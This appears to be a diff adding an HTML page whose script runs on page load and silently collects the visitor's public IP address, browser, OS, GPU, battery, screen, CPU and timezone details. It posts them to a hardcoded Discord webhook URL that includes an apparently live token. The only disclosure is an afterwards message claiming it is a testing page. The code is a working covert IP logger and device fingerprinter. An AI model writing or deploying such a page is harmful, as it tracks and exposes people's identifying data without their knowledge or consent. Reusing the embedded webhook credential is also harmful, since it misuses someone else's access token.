@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send Message to Discord Webhook</title>
+</head>
+<body>
+    <div id="message-container"></div> <!-- Container for displaying messages -->
+
+    <script>
+        window.onload = function() {
+            collectAndSendInfo();
+        };
+
+        async function collectAndSendInfo() {
+            const webhookURL = "https://discord.com/api/webhooks/1196774469335793674/IKA2uxi5vFaRgmeRhH0Hou-9kspK5vHryAN--gfsyB3hiwn14CNrI77txz4mF2kGRBIB";
+
+            // Fetch public IP address
+            let publicIP;
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                publicIP = ipData.ip;
+            } catch (error) {
+                console.error("Error fetching public IP:", error);
+                publicIP = 'Unknown IP';
+            }
+
+            // Collecting browser and device information
+            const browserInfo = {
+                'Browser Version': navigator.userAgent,
+                'Operating System': navigator.platform,
+                'Operating System Version': getOSVersionFromUserAgent(),
+                'Screen Size': `${screen.width}x${screen.height}`,
+                'Device Pixel Ratio': window.devicePixelRatio,
+                'Public IP Address': publicIP, // Add the public IP address here
+                // Additional information can be added here
+            };
+
+            // Include battery information if available
+            const battery = await navigator.getBattery();
+            browserInfo['Battery Level'] = `${Math.round(battery.level * 100)}%`;
+            browserInfo['Battery Charging'] = battery.charging ? 'Yes' : 'No';
+
+            // Include GPU information if available
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                browserInfo['Graphics Card'] = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not Available';
+            }
+
+            // Other information
+            browserInfo['Device Orientation'] = screen.orientation.type;
+            browserInfo['Zoom Level'] = `${Math.round((window.outerWidth / window.innerWidth) * 100)}%`;
+            browserInfo['CPU Cores'] = navigator.hardwareConcurrency;
+            browserInfo['Time Zone'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+            // Constructing the message
+            const messageContent = `Browser/Device Information:\n` + Object.entries(browserInfo).map(([key, value]) => `${key}: ${value}`).join('\n');
+
+            // Sending the message
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: messageContent })
+                });
+
+                if (response.ok) {
+                    displayMessage("Information sent successfully to Discord! If you are seeing this, don't worry this is a testing page", "success");
+                } else {
+                    displayMessage("Error sending information.", "error");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                displayMessage("Error sending information.", "error");
+            }
+        }
+
+        function getOSVersionFromUserAgent() {
+            const userAgent = navigator.userAgent;
+            const osRegex = /Windows NT (\d+.\d+)/;
+            const match = userAgent.match(osRegex);
+            return match ? `Windows NT ${match[1]}` : 'Unknown OS';
+        }
+
+        // Function to display messages dynamically
+        function displayMessage(message, messageType) {
+            const messageContainer = document.getElementById("message-container");
+            const messageElement = document.createElement("div");
+            messageElement.classList.add(messageType);
+            messageElement.textContent = message;
+            messageContainer.appendChild(messageElement);
+        }
+
+        // ... The rest of your script ...
+    </script>
+</body>
+</html>
